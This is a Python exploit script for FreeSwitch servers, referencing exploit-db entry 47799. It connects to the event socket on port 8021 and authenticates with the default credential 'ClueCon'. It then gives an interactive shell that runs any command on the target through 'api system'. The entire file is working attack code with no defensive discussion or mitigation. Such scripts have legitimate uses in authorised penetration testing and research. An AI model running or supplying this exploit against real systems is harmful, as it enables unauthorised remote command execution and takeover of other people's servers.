#!/usr/bin/env python3
'''
    FreeSwitch uses a default credential and allows us command execution.
    See https://www.exploit-db.com/exploits/47799
'''
import argparse, socket, signal, sys



def parseargs():
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--target')
    parser.add_argument('-p', '--port', default = '8021', required = False)

    return parser.parse_args()



class Connection:
    def __init__(self, target, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((target, int(port)))


    def _receive(self):
        return self.socket.recv(1024).decode()


    def _send(self, tosend):
        self.socket.send("{}\n\n".format(tosend).encode())


    def auth(self):
        if 'auth/request' in self._receive():
            self._send("auth ClueCon\n\n")

            if '+OK accepted'in self._receive(): return True
            else: return False


    def do_command(self, command):
        self._send("api system \"{}\"\n\n".format(command))
        return self._receive()


    def shutdown(self):
        self.socket.shutdown(socket.SHUT_RDWR)
        self.socket.close()


def main():
    def shutdown(signal, frame):
        connection.shutdown()
        sys.exit(0)


    signal.signal(signal.SIGINT, shutdown)
    args = parseargs()

    connection = Connection(args.target, args.port)
    if connection.auth():
        while True:
            command = input('> ')
            print(connection.do_command(command))


if __name__ == '__main__': main()
